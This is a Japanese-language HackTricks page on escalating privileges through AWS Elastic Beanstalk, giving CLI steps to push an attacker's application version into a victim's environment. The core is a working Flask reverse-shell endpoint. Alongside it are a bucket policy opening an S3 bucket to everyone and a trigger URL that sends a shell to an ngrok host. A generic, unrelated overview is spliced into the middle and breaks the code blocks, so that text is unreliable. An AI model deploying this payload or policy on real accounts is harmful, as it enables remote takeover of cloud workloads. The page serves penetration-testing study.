# AWS - Elastic Beanstalk特権エスカレーション

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* HackTricksをサポートし、特典を受け取るには、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をご確認ください。企業の広告をHackTricksで見たい場合や、最新バージョンのPEASSやHackTricksをPDFでダウンロードしたい場合は、こちらをご覧ください。
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを発見しましょう。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローしましょう🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。

</details>

## Elastic Beanstalk

Elastic Beanstalkに関する詳細情報は次を参照してください：

{% content-ref url="../aws-services/aws-elastic-beanstalk-enum.md" %}
[aws-elastic-beanstalk-enum.md](../aws-services/aws-elastic-beanstalk-enum.md)
{% endcontent-ref %}

### `elasticbeanstalk:CreateApplication`、`elasticbeanstalk:CreateEnvironment`、`elasticbeanstalk:CreateApplicationVersion`、`elasticbeanstalk:UpdateEnvironment`、`iam:PassRole`など...

上記の他にも、**`S3`**、**`EC2`**、**`cloudformation`**、**`autoscaling`**、**`elasticloadbalancing`**の権限が必要です。これらの権限は、Elastic Beanstalkシナリオをゼロから作成するために必要です。

* AWS Elastic Beanstalkアプリケーションを作成します：
```bash
aws elasticbeanstalk create-application --application-name MyApp
```
* AWS Elastic Beanstalk環境を作成します（[**サポートされているプラットフォーム**](https://docs.aws.amazon.com/elasticbeanstalk/latest/platforms/platforms-supported.html#platforms-supported.python)）:

{% code overflow="wrap" %}
```bash
aws elasticbeanstalk create-environment --application-name MyApp --environment-name MyEnv --solution-stack-name "64bit Amazon Linux 2 v3.4.2 running Python 3.8" --option-settings Namespace=aws:autoscaling:launchconfiguration,OptionName=IamInstanceProfile,Value=aws-elasticbeanstalk-ec2-role
```
{% endcode %}

環境が既に作成されており、**新しい環境を作成したくない**場合は、既存の環境を**更新**することもできます。

* アプリケーションコードと依存関係をZIPファイルにパッケージ化します：
```python
zip -r MyApp.zip .
```
* S3バケットにZIPファイルをアップロードします：
```python
aws s3 cp MyApp.zip s3://elasticbeanstalk-<region>-<accId>/MyApp.zip
```
* AWS Elastic Beanstalkアプリケーションバージョンの作成:

{% code overflow="wrap" %}
```css
aws elasticbeanstalk create-application-version --application-name MyApp --version-label MyApp-1.0 --source-bundle S3Bucket="elasticbeanstalk-<region>-<accId>",S3Key="MyApp.zip"
```
* AWS Elastic Beanstalk環境にアプリケーションバージョンをデプロイします：

{% code overflow="wrap" %}
```bash
aws elasticbeanstalk update-environment --environment-name MyEnv --version-label MyApp-1.0
```
{% endcode %}

### `elasticbeanstalk:CreateApplicationVersion`, `elasticbeanstalk:UpdateEnvironment`, `cloudformation:GetTemplate`, `cloudformation:DescribeStackResources`, `cloudformation:DescribeStackResource`, `autoscaling:DescribeAutoScalingGroups`, `autoscaling:SuspendProcesses`, `autoscaling:SuspendProcesses`

まず、**前の手順**に従って、**被害者**で実行したい**コード**を含む**正規のBeanstalk環境**を作成する必要があります。おそらく、これらの**2つのファイル**を含む単純な**zip**ファイルです。

{% tabs %}
{% tab title="application.py" %}
```python
from flask import Flask, request, jsonify
import subprocess,os, socket

application = Flask(__name__)

@application.errorhandler(404)
def page_not_found(e):
return jsonify('404')

@application.route("/")
def index():
return jsonify('Welcome!')


@application.route("/get_shell")
def search():
host=request.args.get('host')
port=request.args.get('port')
if host and port:
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((host,int(port)))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
return jsonify('done')

if __name__=="__main__":
application.run()
```
{% tab title="requirements.txt" %}
```
click==7.1.2
Flask==1.1.2
itsdangerous==1.1.0
Jinja2==2.11.3
MarkupSafe==1.1.1
Werkzeug==1.0.1
```
{% endtab %}
{% endtabs %}

自分のBeanstalk環境でrev shellを実行している場合、それを被害者の環境に移行する時が来ました。そのためには、BeanstalkのS3バケットのBucket Policyを更新して、被害者がアクセスできるようにする必要があります（注意：これによりバケットは「誰でも」アクセスできるようになります）。
```json
{
"Version": "2008-10-17",
"Statement": [
{
"Sid": "eb-af163bf3-d27b-4712-b795-d1e33e331ca4",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"s3:ListBucket",
"s3:ListBucketVersions",
"s3:GetObject",
"s3:GetObjectVersion",
"s3:*"
],
"Resource": [
"arn:aws:s3:::elasticbeanstalk-us-east-1-947247140022",
"arn:aws:s3:::elasticbeanstalk-us-east-1-947247140022/*"
]
},
{
"Sid": "eb-58950a8c-feb6-11e2-89e0-0800277d041b",
"Effect": "Deny",
"Principal": {
"AWS": "*"
},
"Action": "s3:DeleteBucket",
"Resource": "arn:aws:s3:::elasticbeanstalk-us-east-1-947247140022"
}
]
}
```
以下は、AWS Elastic Beanstalkの特権エスカレーションに関する情報です。

## 概要

AWS Elastic Beanstalkは、アプリケーションのデプロイ、スケーリング、管理を簡素化するためのサービスです。しかし、適切な設定が行われていない場合、特権エスカレーションのリスクが存在します。

## 特権エスカレーションの手法

### 1. 環境変数の悪用

Elastic Beanstalkでは、アプリケーションの環境変数を設定することができます。攻撃者は、これらの環境変数を悪用して特権をエスカレーションさせることができます。

攻撃者は、以下の手順に従って特権エスカレーションを行います。

1. 攻撃者は、アプリケーションの環境変数を調査します。
2. 攻撃者は、特権を持つ環境変数を見つけます。
3. 攻撃者は、特権を持つ環境変数を悪用して、アプリケーション内でコードを実行します。

### 2. IAMロールの悪用

Elastic Beanstalkでは、IAMロールを使用してアプリケーションにアクセス権を付与することができます。攻撃者は、IAMロールの悪用を通じて特権エスカレーションを行うことができます。

攻撃者は、以下の手順に従って特権エスカレーションを行います。

1. 攻撃者は、アプリケーションが使用しているIAMロールを調査します。
2. 攻撃者は、特権を持つIAMロールを見つけます。
3. 攻撃者は、特権を持つIAMロールを悪用して、アプリケーション内でコードを実行します。

## 対策方法

特権エスカレーションを防ぐためには、以下の対策を実施することが重要です。

- 環境変数の適切な設定と管理を行う。
- IAMロールの適切な設定と管理を行う。
- アプリケーションのセキュリティを定期的に監査する。

以上が、AWS Elastic Beanstalkにおける特権エスカレーションの手法と対策方法です。特権エスカレーションのリスクを最小限に抑えるために、適切なセキュリティ対策を実施しましょう。{% endcode %}
```bash
# Use a new --version-label
# Use the bucket from your own account
aws elasticbeanstalk create-application-version --application-name MyApp --version-label MyApp-2.0 --source-bundle S3Bucket="elasticbeanstalk-<region>-<accId>",S3Key="revshell.zip"

# These step needs the extra permissions
aws elasticbeanstalk update-environment --environment-name MyEnv --version-label MyApp-1.0

# To get your rev shell just access the exposed web URL with params such as:
http://myenv.eba-ankaia7k.us-east-1.elasticbeanstalk.com/get_shell?host=0.tcp.eu.ngrok.io&port=13528
```
{% endcode %}

<details>

<summary><strong>ハックトリックをサポートして特典を得る！</strong></summary>

* もし、あなたの**会社をハックトリックで宣伝したい**場合や、**最新版のPEASSを入手したい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式のPEASS＆ハックトリックのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを発見しましょう。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローしましょう🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **ハッキングのトリックを共有するために、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **および** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**

</details>
